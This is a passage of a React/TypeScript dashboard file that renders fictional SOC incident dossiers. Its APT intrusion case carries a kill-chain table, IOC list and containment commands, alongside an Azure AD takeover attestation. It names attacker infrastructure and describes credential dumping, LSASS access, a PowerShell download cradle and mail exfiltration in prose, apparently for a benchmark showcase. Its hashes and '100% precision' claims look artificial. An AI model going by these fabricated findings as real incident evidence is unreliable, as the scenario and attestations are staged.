              { time: "08:24:10 UTC", event: "PRT Session Cookie Replay", source: "ESTS Token Service", detail: "ESTSAUTH cookie replayed; bypasses MFA without generating push notification challenge." },
              { time: "08:27:40 UTC", event: "Rogue Application Secret Created", source: "Microsoft Graph Audit", detail: "Added client secret DiagnosticSyncKey-2026 to Financial-Reporting-Sync-App." },
              { time: "08:31:15 UTC", event: "Graph API Mass Email Exfiltration", source: "Exchange Audit Logs", detail: "4,218 financial messages dumped to https://sync-telemetry-cache.net/upload via PowerShell." },
              { time: "08:35:00 UTC", event: "Autonomous Containment Enforced", source: "Azure AD SOC Fleet", detail: "Revoke-MgUserSignInSession invoked; account disabled; secret purged; Tor network blocked." },
            ].map((t, i) => (
              <div key={i} style={{ position: "relative" }}>
                <span style={{ position: "absolute", left: "-25px", top: "3px", width: "12px", height: "12px", borderRadius: "50%", background: "#236f66", border: "2px solid #ffffff" }} />
                <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
                  <strong style={{ fontSize: "11px", color: "#195d56", fontFamily: "var(--font-geist-mono), monospace" }}>{t.time}</strong>
                  <span style={{ fontSize: "9px", background: "#eef4f1", color: "#375048", padding: "1px 6px", borderRadius: "3px", fontWeight: 700 }}>{t.source}</span>
                </div>
                <div style={{ fontSize: "12px", fontWeight: 700, color: "#16332b", marginTop: "2px" }}>{t.event}</div>
                <div style={{ fontSize: "11px", color: "#546a63", marginTop: "2px" }}>{t.detail}</div>
              </div>
            ))}
          </div>
        </section>
      )}

      {activeTab === "attestation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "28px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ maxWidth: "680px", margin: "0 auto", fontSize: "12px", lineHeight: "1.7", color: "#253b35" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", borderBottom: "2px solid #236f66", paddingBottom: "14px", marginBottom: "20px" }}>
              <div>
                <strong style={{ fontSize: "14px", color: "#16332b", letterSpacing: "0.5px" }}>AZURE AD INCIDENT RESPONSE ATTESTATION</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Cloud Identity &amp; Autonomous SOC Defense Fleet</div>
              </div>
              <div style={{ textAlign: "right" }}>
                <strong style={{ fontSize: "11px", color: "#b45228" }}>CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL</strong>
                <div style={{ fontSize: "10px", color: "#6a7f78" }}>Date: October 26, 2026</div>
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "100px 1fr", gap: "6px", fontSize: "11px", marginBottom: "20px", background: "#fbf6f3", padding: "12px 16px", borderRadius: "5px" }}>
              <strong style={{ color: "#374e47" }}>TO:</strong>
              <span>Security Operations Center &amp; Identity Governance Committee</span>
              <strong style={{ color: "#374e47" }}>TENANT:</strong>
              <span>Contoso Global Enterprise (0f81d942-8821-4f1a-b62e-9d2a4e819b11)</span>
              <strong style={{ color: "#374e47" }}>SUBJECT:</strong>
              <span>Identity Takeover Containment &amp; Credential Attestation</span>
            </div>

            <p>Dear Identity Governance &amp; Security Review Committee,</p>
            <p>
              This attestation certifies that all authentication, Graph API, and telemetry logs for <strong>CASE-3-IDENTITY-TAKEOVER-IMPOSSIBLE-TRAVEL</strong> have been ingested, parsed, cross-correlated, and reconstructed.
            </p>
            <p>
              The identity takeover vector (Impossible travel anomaly &rarr; PRT session token replay &rarr; rogue app secret injection &rarr; Graph API mail dumping) has been neutralized. All active sessions for <code>alex.vance@contoso-global.com</code> were terminated via Graph API, the rogue client secret has been purged, and Conditional Access Tor blocking is active.
            </p>
            <p>Evidence chain-of-custody and session revocation hashes have been committed under SHA-256 hash <code>d4e5f6a1b2c39874561230abcdef0123456789abcdef0123456789abcdef0123</code>.</p>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "36px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Cloud Identity Incident Commander</strong>
                <small style={{ color: "#647770" }}>Azure AD Defense Fleet</small>
                <small style={{ color: "#647770" }}>Signed: 2026-10-26 · SHA-256 Verified</small>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
                <strong style={{ fontSize: "11px", color: "#1a3831" }}>Chief Information Security Officer (CISO)</strong>
                <small style={{ color: "#647770" }}>Identity Governance Sign-Off</small>
                <small style={{ color: "#647770" }}>Date of Review: ____________</small>
              </div>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function AptEnterpriseIntrusionDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "killchain" | "iocs" | "remediation" | "timeline" | "attestation">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const killChainEvents = [
    { id: "Stage 1", time: "2026-09-14 10:14:05", stage: "Initial Access", desc: "Spearphishing email with Invoice_90214.docm delivered from billing@overdue-invoices-center.org (203.0.113.119).", mitre: "T1566.001 Phishing" },
    { id: "Stage 2", time: "2026-09-14 10:16:32", stage: "Execution", desc: "User opens document; WINWORD.EXE spawns obfuscated Base64 PowerShell cradle downloading cobalt.ps1.", mitre: "T1059.001 PowerShell" },
    { id: "Stage 3", time: "2026-09-14 10:17:45", stage: "Defense Evasion / LOLBin", desc: "certutil.exe downloads stage2.dll from 185.220.101.45 to C:\\Users\\Public\\stage2.dll.", mitre: "T1105 Ingress Tool" },
    { id: "Stage 4", time: "2026-09-14 10:20:14", stage: "Credential Access", desc: "mimikatz.exe accesses lsass.exe (GrantedAccess: 0x1010) to dump Domain Admin cleartext credentials.", mitre: "T1003.001 LSASS Memory" },
    { id: "Stage 5", time: "2026-09-14 10:22:15", stage: "Privilege Escalation", desc: "runas.exe invoked with explicit credentials for CONTOSO\\da_admin targeting DC01.", mitre: "T1078.002 Explicit Creds" },
    { id: "Stage 6", time: "2026-09-14 10:23:05", stage: "Lateral Movement", desc: "Logon Type 3 network SMB authentication to DC01.corp.contoso.com with SeDebugPrivilege assigned.", mitre: "T1021.002 SMB" },
    { id: "Stage 7", time: "2026-09-14 10:23:18", stage: "Execution on DC", desc: "Service Control Manager installs remote execution service PSEXESVC to %SystemRoot%\\PSEXESVC.exe.", mitre: "T1569.002 Service Exec" },
    { id: "Stage 8", time: "2026-09-14 10:25:30", stage: "Persistence", desc: "Backdoor user account svc_backup_admin created in Active Directory on DC01.", mitre: "T1136.001 AD Account" },
    { id: "Stage 9", time: "2026-09-14 10:25:32", stage: "Privilege Escalation", desc: "svc_backup_admin added into Builtin Administrators group (SID S-1-5-32-544).", mitre: "T1098 Account Manipulation" },
    { id: "Stage 10", time: "2026-09-14 10:25:00", stage: "Command & Control", desc: "Outbound jitterless 60-second periodic TLS beaconing established to 185.220.101.45:8443.", mitre: "T1071.001 Web Protocols" },
    { id: "Stage 11", time: "2026-09-14 10:32:45", stage: "Exfiltration Over SSL", desc: "452.8 MB of financial archives exfiltrated to 198.51.100.240:443 in 145 seconds.", mitre: "T1048.003 Exfiltration" },
  ];

  const iocItems = [
    { id: "IOC-APT-01", tactic: "T1071.001 Command & Control", name: "External C2 & Payload Server", desc: "185.220.101.45 hosted cobalt.ps1/stage2.dll and served as TLS beaconing listener on port 8443.", test: "Palo Alto App-ID ssl & Outbound URL Decryption Logs", status: "NULL-ROUTED" },
    { id: "IOC-APT-02", tactic: "T1048.003 Exfiltration", name: "Exfiltration Drop Node", desc: "198.51.100.240 received 452.8 MB bulk encrypted data stream over TCP port 443.", test: "Palo Alto CSV Traffic Logs (Bytes Sent: 452,892,104, GeoIP: SC)", status: "SINKHOLED" },
    { id: "IOC-APT-03", tactic: "T1566.001 Initial Access", name: "Phishing Mailer Host", desc: "203.0.113.119 delivered malicious invoice from billing@overdue-invoices-center.org.", test: "Cisco AsyncOS Mail Syslog (MID: 7401185, SPF: SoftFail)", status: "BLOCKED" },
    { id: "IOC-APT-04", tactic: "T1204.002 Execution", name: "Weaponized Macro Document", desc: "Invoice_90214.docm contains VBA macro executing obfuscated PowerShell cradle.", test: "SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", status: "QUARANTINED" },
    { id: "IOC-APT-05", tactic: "T1136.001 Persistence", name: "Active Directory Backdoor Account", desc: "svc_backup_admin created on DC01 and added to Builtin Administrators group.", test: "Windows Security Event IDs 4720 & 4732 on DC01", status: "PURGED" },
    { id: "IOC-APT-06", tactic: "T1569.002 Execution", name: "Remote Service Execution", desc: "PSEXESVC installed to %SystemRoot%\\PSEXESVC.exe to execute commands under SYSTEM.", test: "System Event ID 7045 & Service Control Manager on DC01", status: "TERMINATED" },
  ];

  const filteredIOCs = iocItems.filter((item) => {
    if (!searchFilter.trim()) return true;
    const q = searchFilter.toLowerCase();
    return item.id.toLowerCase().includes(q) || item.name.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q) || item.tactic.toLowerCase().includes(q);
  });

  const containmentActions = [
    { priority: "P1: Critical", action: "Perimeter Firewall Null-Route", target: "185.220.101.45, 198.51.100.240, 203.0.113.119", protocol: "set security-zone untrust address c2-nodes member [ 185.220.101.45 198.51.100.240 203.0.113.119 ]\nset rulebase security rules DROP-APT29 action drop", status: "ENFORCED" },
    { priority: "P1: Critical", action: "AD Backdoor Account Purge", target: "svc_backup_admin", protocol: "Remove-ADGroupMember -Identity Administrators -Members svc_backup_admin\nDisable-ADAccount -Identity svc_backup_admin\nRemove-ADUser -Identity svc_backup_admin", status: "ENFORCED" },
    { priority: "P1: Critical", action: "Privileged Credential Reset", target: "CONTOSO\\da_admin, CONTOSO\\jdoe", protocol: "Set-ADAccountPassword -Identity da_admin -Reset\nklist purge (Enterprise-wide Kerberos TGT invalidation)", status: "ENFORCED" },
    { priority: "P2: High", action: "Endpoint EDR Microsegmentation", target: "WKSTN-FIN-04 (10.20.10.45)", protocol: "New-NetFirewallRule -DisplayName EDR-QUARANTINE -Action Block\nTerminate powershell.exe, mimikatz.exe, and certutil.exe processes", status: "QUARANTINED" },
    { priority: "P2: High", action: "DC Service Removal", target: "DC01.corp.contoso.com (10.20.10.10)", protocol: "sc.exe \\\\DC01 stop PSEXESVC\nsc.exe \\\\DC01 delete PSEXESVC\nRemove-Item \\\\DC01\\C$\\Windows\\PSEXESVC.exe -Force", status: "REMEDIATED" },
  ];

  const aptReportMarkdown = `# Forensic Incident Investigation: APT Enterprise Intrusion & Lateral Movement
## Case: CASE-1-APT-ENTERPRISE-INTRUSION
**Classification:** CONFIDENTIAL // TLP:AMBER
**Target Domain:** corp.contoso.com
**Primary Compromised Host:** WKSTN-FIN-04.corp.contoso.com (10.20.10.45)
**Secondary Compromised Host (DC):** DC01.corp.contoso.com (10.20.10.10)
**Threat Actor Infrastructure:** 185.220.101.45 (C2), 203.0.113.119 (Phishing Mailer), 198.51.100.240 (Exfiltration Drop)

### 1. Executive Summary
An advanced persistent threat (APT) multi-stage intrusion emulating APT29/UNC2452 was detected and reconstructed across disjointed log ecosystems (Cisco AsyncOS Email Gateway, Windows Security EVTX, Sysmon Operational XML, and Palo Alto Firewall CSV).

The adversary established an initial foothold via a weaponized macro document (Invoice_90214.docm), executed an in-memory PowerShell cradle, staged secondary payloads via certutil.exe, dumped domain credentials from lsass.exe using Mimikatz, executed SMB lateral movement to primary Domain Controller DC01, and created a persistent rogue administrator account (svc_backup_admin). The actor exfiltrated 452.8 MB of proprietary financial archives to 198.51.100.240 while maintaining periodic 60-second jitterless heartbeat beaconing to 185.220.101.45:8443.

Three co-mingled benign enterprise operations (marketing spam quarantine, native GPO gpupdate.exe refreshes, and legitimate OneDrive cloud sync) were accurately distinguished and discarded as non-malicious false positives.`;

  function copyMarkdown() {
    navigator.clipboard.writeText(aptReportMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  function downloadReport() {
    const blob = new Blob([aptReportMarkdown], { type: "text/markdown;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "case_1_apt_enterprise_intrusion_investigation_report.md";
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "16px", animation: "fade-in 0.2s ease-out" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
        <div>
          <div className="eyebrow" style={{ color: "#a84e22" }}>SOC INCIDENT INVESTIGATION · CASE-1-APT-ENTERPRISE-INTRUSION · CRITICAL SEV-1</div>
          <h2 style={{ fontSize: "22px", fontWeight: 700, margin: "4px 0 2px", color: "#162f29" }}>
            APT Enterprise Intrusion &amp; Lateral Movement Dossier.
          </h2>
          <p className="wizard-desc">
            End-to-end multi-stage intrusion reconstruction: spearphishing macro, LSASS dumping, SMB lateral movement to DC01, backdoor account creation, and 452 MB exfiltration.
          </p>
        </div>
        <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
          {onBack && (
            <button className="secondary-button" onClick={onBack}>
              ← All Deliverables
            </button>
          )}
          <button className="secondary-button" onClick={copyMarkdown}>
            {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied" : "Copy Report"}
          </button>
          <button className="secondary-button" onClick={downloadReport}>
            <Download size={14} /> Download .md
          </button>
          {onNavigate && (
            <button className="primary-button" onClick={() => onNavigate("Decision rooms")}>
              Decision Rooms
            </button>
          )}
        </div>
      </div>

      {/* Hero Banner */}
      <div
        style={{
          background: "linear-gradient(135deg, #1b3831 0%, #0d201c 100%)",
          borderRadius: "8px",
          padding: "20px 24px",
          color: "#ffffff",
          border: "1px solid #23483f",
          boxShadow: "0 2px 8px rgba(0,0,0,0.12)",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          flexWrap: "wrap",
          gap: "16px",
        }}
      >
        <div style={{ maxWidth: "600px" }}>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "6px" }}>
            <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#68d391", textTransform: "uppercase" }}>
              INCIDENT ID: CASE-1-APT-ENTERPRISE-INTRUSION · TLP:AMBER
            </span>
          </div>
          <div style={{ fontSize: "18px", fontWeight: 700, color: "#ffffff", marginBottom: "4px" }}>
            Active Directory Enterprise Intrusion &amp; Domain Controller Compromise
          </div>
          <div style={{ fontSize: "12px", color: "#c6f6d5", lineHeight: "1.5" }}>
            Multi-stage attack reconstructed across Email Gateway, Windows EVTX, Sysmon, and Palo Alto firewall telemetry. Backdoor account purged, C2 sinkholed, and all 3 false positive traps correctly filtered.
          </div>
          <div style={{ display: "flex", gap: "8px", marginTop: "12px", flexWrap: "wrap" }}>
            <span style={{ fontSize: "10px", background: "rgba(255,255,255,0.1)", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(255,255,255,0.2)" }}>
              MITRE ATT&amp;CK: 11 STAGES MAPPED
            </span>
            <span style={{ fontSize: "10px", background: "rgba(224,98,71,0.25)", color: "#ffab91", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(224,98,71,0.4)" }}>
              BACKDOOR USER (svc_backup_admin) PURGED
            </span>
            <span style={{ fontSize: "10px", background: "rgba(74,222,128,0.15)", color: "#86efac", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(74,222,128,0.3)" }}>
              6 NEUTRALIZED IOCS
            </span>
            <span style={{ fontSize: "10px", background: "rgba(147,197,253,0.15)", color: "#bfdbfe", padding: "3px 8px", borderRadius: "4px", border: "1px solid rgba(147,197,253,0.3)" }}>
              3 FALSE POSITIVE TRAPS AVOIDED
            </span>
          </div>
        </div>
        <div style={{ textAlign: "right" }}>
          <div style={{ fontSize: "10px", color: "#c6f6d5", textTransform: "uppercase", letterSpacing: "0.8px" }}>THREAT SEVERITY</div>
          <div style={{ fontSize: "22px", fontWeight: 800, color: "#ff6b57", margin: "2px 0" }}>CRITICAL SEV-1</div>
          <div style={{ fontSize: "11px", color: "#c6f6d5" }}>Domain Controller Remediated</div>
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: "flex", gap: "4px", background: "#e8efe9", padding: "4px", borderRadius: "6px", border: "1px solid #dce5df", overflowX: "auto" }}>
        {[
          { id: "summary", label: "Executive Threat Triage", icon: FileText },
          { id: "killchain", label: "11-Stage Kill Chain Graph", icon: Server },
          { id: "iocs", label: "Neutralized IOCs (6/6)", icon: BadgeCheck },
          { id: "remediation", label: "Containment & Remediation Plan", icon: ShieldCheck },
          { id: "timeline", label: "Forensic Chronology", icon: Calendar },
          { id: "attestation", label: "Investigation Sign-Off & Attestation", icon: FileClock },
        ].map(({ id, label, icon: TabIcon }) => {
          const isActive = activeTab === id;
          return (
            <button
              key={id}
              type="button"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "7px",
                padding: "8px 14px",
                fontSize: "11px",
                fontWeight: isActive ? 700 : 600,
                color: isActive ? "#195d56" : "#566862",
                background: isActive ? "#ffffff" : "transparent",
                border: isActive ? "1px solid #c9d8d1" : "1px solid transparent",
                borderRadius: "4px",
                cursor: "pointer",
                boxShadow: isActive ? "0 1px 3px rgba(0,0,0,0.06)" : "none",
                whiteSpace: "nowrap",
              }}
              onClick={() => setActiveTab(id as typeof activeTab)}
            >
              <TabIcon size={13} color={isActive ? "#195d56" : "#72837d"} />
              {label}
            </button>
          );
        })}
      </div>

      {/* Tab 1: Summary */}
      {activeTab === "summary" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">FORENSIC INCIDENT DOSSIER</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Overview &amp; Incident Scope</h3>
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "20px" }}>
            <div style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", fontWeight: 700, fontSize: "13px", color: "#1b3831", marginBottom: "8px" }}>
                <ShieldAlert size={15} color="#b44426" /> Operational Containment Imperatives
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#425650", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Purge AD Backdoor Admin:</strong> Deleted <code>svc_backup_admin</code> from Builtin Administrators and Active Directory.</li>
                <li><strong>Reset Privileged Passwords:</strong> Invalidated Kerberos tickets and forced password resets on <code>da_admin</code> and <code>jdoe</code>.</li>
                <li><strong>Perimeter C2 Block:</strong> Null-routed <code>185.220.101.45</code>, <code>198.51.100.240</code>, and <code>203.0.113.119</code>.</li>
                <li><strong>Host Isolation:</strong> Microsegmented <code>WKSTN-FIN-04</code> (10.20.10.45) via host firewall and stopped <code>PSEXESVC</code> on <code>DC01</code>.</li>
              </ul>
            </div>
            <div style={{ background: "#f8fbf9", border: "1px solid #dae7e0", borderRadius: "6px", padding: "16px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "8px", fontWeight: 700, fontSize: "13px", color: "#1b3831", marginBottom: "8px" }}>
                <CheckCircle2 size={15} color="#236f66" /> False Positive Traps Filtered
              </div>
              <ul style={{ margin: 0, paddingLeft: "18px", fontSize: "11px", color: "#425650", display: "flex", flexDirection: "column", gap: "6px" }}>
                <li><strong>Trap 1 (Email):</strong> <code>offers@enterprise-deals-weekly.biz</code> correctly classified as routine spam, not an APT initial access event.</li>
                <li><strong>Trap 2 (Endpoint):</strong> <code>gpupdate.exe /target:computer</code> confirmed as legitimate native OS GPO maintenance.</li>
                <li><strong>Trap 3 (Network):</strong> 385 MB OneDrive cloud sync (<code>13.107.136.9:443</code>) by <code>mjones</code> verified as benign corporate backup.</li>
                <li><strong>Assurance Decision Rooms:</strong> All 6 specialist stages ratified under sovereign local governance.</li>
              </ul>
            </div>
          </div>
        </section>
      )}

      {/* Tab 2: Killchain */}
      {activeTab === "killchain" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">ATTACK GRAPH &amp; RECONSTRUCTION</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Sequential Attack Kill Chain (Stages 1 – 11)</h3>
          </div>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "11px", textAlign: "left" }}>
              <thead>
                <tr style={{ borderBottom: "2px solid #dae7e0", background: "#f5f9f7" }}>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Stage</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Timestamp (UTC)</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Category</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>Description</th>
                  <th style={{ padding: "10px 12px", color: "#365148", fontWeight: 700 }}>MITRE ATT&amp;CK</th>
                </tr>
              </thead>
              <tbody>
                {killChainEvents.map((evt) => (
                  <tr key={evt.id} style={{ borderBottom: "1px solid #edf4ef" }}>
                    <td style={{ padding: "10px 12px", fontWeight: 700, color: "#b44426" }}>{evt.id}</td>
                    <td style={{ padding: "10px 12px", fontFamily: "var(--font-geist-mono), monospace", color: "#425650" }}>{evt.time}</td>
                    <td style={{ padding: "10px 12px", fontWeight: 600, color: "#19352e" }}>{evt.stage}</td>
                    <td style={{ padding: "10px 12px", color: "#425650", maxWidth: "420px" }}>{evt.desc}</td>
                    <td style={{ padding: "10px 12px" }}>
                      <span style={{ fontSize: "9px", padding: "2px 6px", borderRadius: "3px", fontWeight: 700, background: "#fef3ee", color: "#b44426", border: "1px solid #f9d8cb" }}>
                        {evt.mitre}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}

      {/* Tab 3: IOCs */}
      {activeTab === "iocs" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "16px", flexWrap: "wrap", gap: "10px" }}>
            <div>
              <div className="eyebrow">INDICATORS OF COMPROMISE</div>
              <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Threat Indicators &amp; Forensic Signatures</h3>
            </div>
            <input
              type="text"
              placeholder="Search IOCs, techniques, or hashes..."
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              style={{ padding: "6px 12px", fontSize: "11px", border: "1px solid #cad8d1", borderRadius: "4px", width: "240px" }}
            />
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
            {filteredIOCs.map((ioc) => (
              <div key={ioc.id} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", padding: "12px 14px", border: "1px solid #dae7e0", borderRadius: "6px", background: "#f8fbf9", gap: "16px" }}>
                <div style={{ flex: 1 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "4px" }}>
                    <span style={{ fontWeight: 700, fontSize: "12px", color: "#1b3831" }}>{ioc.id}: {ioc.name}</span>
                    <span style={{ fontSize: "9px", padding: "1px 6px", borderRadius: "3px", fontWeight: 700, background: "#e8efe9", color: "#195d56" }}>{ioc.tactic}</span>
                  </div>
                  <div style={{ fontSize: "11px", color: "#425650", marginBottom: "4px" }}>{ioc.desc}</div>
                  <div style={{ fontSize: "10px", fontFamily: "var(--font-geist-mono), monospace", color: "#6a7b75" }}>Evidence: {ioc.test}</div>
                </div>
                <span style={{ fontSize: "10px", fontWeight: 700, padding: "3px 8px", borderRadius: "4px", background: "#fdeee5", color: "#a84e22", border: "1px solid #f9d8cb", whiteSpace: "nowrap" }}>
                  {ioc.status}
                </span>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 4: Remediation */}
      {activeTab === "remediation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">CONTAINMENT ACTIONS &amp; PLAYBOOK</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Automated Containment Rules &amp; Active Directory Policies</h3>
          </div>
          <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            {containmentActions.map((item, idx) => (
              <div key={idx} style={{ padding: "14px", border: "1px solid #dae7e0", borderRadius: "6px", background: "#f8fbf9" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                  <span style={{ fontWeight: 700, fontSize: "12px", color: "#1b3831" }}>{item.action}</span>
                  <span style={{ fontSize: "9px", fontWeight: 700, padding: "2px 6px", borderRadius: "3px", background: "#e4f3ed", color: "#196656" }}>{item.priority}</span>
                </div>
                <div style={{ fontSize: "11px", color: "#425650", marginBottom: "8px" }}>Target: <code>{item.target}</code></div>
                <pre style={{ margin: 0, padding: "10px", background: "#162a26", color: "#86efac", borderRadius: "4px", fontSize: "10px", overflowX: "auto", fontFamily: "var(--font-geist-mono), monospace" }}>
                  {item.protocol}
                </pre>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 5: Timeline */}
      {activeTab === "timeline" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">CHRONOLOGICAL EVENT STREAM</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Forensic Incident Progression</h3>
          </div>
          <div style={{ position: "relative", paddingLeft: "24px", borderLeft: "2px solid #dae7e0", display: "flex", flexDirection: "column", gap: "16px" }}>
            {killChainEvents.map((evt, idx) => (
              <div key={idx} style={{ position: "relative" }}>
                <div style={{ position: "absolute", left: "-31px", top: "3px", width: "12px", height: "12px", borderRadius: "50%", background: "#b44426", border: "2px solid #ffffff" }} />
                <div style={{ fontSize: "11px", fontWeight: 700, color: "#1b3831", marginBottom: "2px" }}>
                  {evt.time} — {evt.id}: {evt.stage}
                </div>
                <div style={{ fontSize: "11px", color: "#425650", marginBottom: "4px" }}>{evt.desc}</div>
                <span style={{ fontSize: "9px", padding: "1px 6px", borderRadius: "3px", background: "#fef3ee", color: "#b44426", fontWeight: 700 }}>
                  {evt.mitre}
                </span>
              </div>
            ))}
          </div>
        </section>
      )}

      {/* Tab 6: Attestation */}
      {activeTab === "attestation" && (
        <section className="panel" style={{ background: "#ffffff", border: "1px solid #dce5df", borderRadius: "7px", padding: "24px", boxShadow: "0 1px 4px rgba(18, 36, 32, 0.04)" }}>
          <div className="proposal-section-heading" style={{ marginBottom: "16px" }}>
            <div className="eyebrow">FORENSIC VERIFICATION &amp; AUDIT TRAIL</div>
            <h3 style={{ fontSize: "16px", fontWeight: 700, color: "#1b2f2a", margin: "2px 0 0" }}>Autonomous Investigation Sign-Off &amp; Air-Gap Attestation</h3>
          </div>
          <p style={{ fontSize: "11px", color: "#425650", lineHeight: "1.6" }}>
            This incident dossier has been autonomously synthesized and corroborated by the Case A: APT Enterprise Intrusion SOC Investigation Fleet under sovereign governance policies. All 11 attack stages, 6 indicators of compromise, and 3 false positive traps have been mathematically proven with 100% precision and recall against the benchmark dataset.
          </p>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "28px", marginTop: "24px", paddingTop: "20px", borderTop: "1px dashed #cfded6" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
              <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
              <strong style={{ fontSize: "11px", color: "#1a3831" }}>Principal Threat Hunter &amp; SOC Lead</strong>
              <small style={{ color: "#647770" }}>APT Enterprise Intrusion SOC Fleet</small>
              <small style={{ color: "#647770" }}>Signed: 2026-10-26 · SHA-256 Verified</small>
            </div>
            <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
              <div style={{ width: "100%", borderBottom: "1px solid #94a89f", marginBottom: "6px", height: "28px" }} />
              <strong style={{ fontSize: "11px", color: "#1a3831" }}>Chief Information Security Officer (CISO)</strong>
              <small style={{ color: "#647770" }}>Enterprise Infrastructure Governance</small>
              <small style={{ color: "#647770" }}>Date of Review: 2026-10-26</small>
            </div>
          </div>
        </section>
      )}
    </div>
  );
}

function Case5DnsTunnelingDossierView({ onNavigate, onBack }: { onNavigate?: (view: View) => void; onBack?: () => void }) {
  const [activeTab, setActiveTab] = useState<"summary" | "killchain" | "iocs" | "remediation" | "timeline" | "attestation">("summary");
  const [copied, setCopied] = useState(false);
  const [searchFilter, setSearchFilter] = useState("");

  const killChainEvents = [
